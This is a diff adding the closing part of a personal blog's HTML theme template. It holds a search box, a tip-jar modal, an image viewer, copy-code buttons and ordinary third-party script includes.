+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯茶吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/H-Limbus/h-limbus.github.io@latest/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/H-Limbus/h-limbus.github.io@latest/images/wechat.png">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+ 
+<script src="/js/clickBoom2.js"></script>
+ 
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
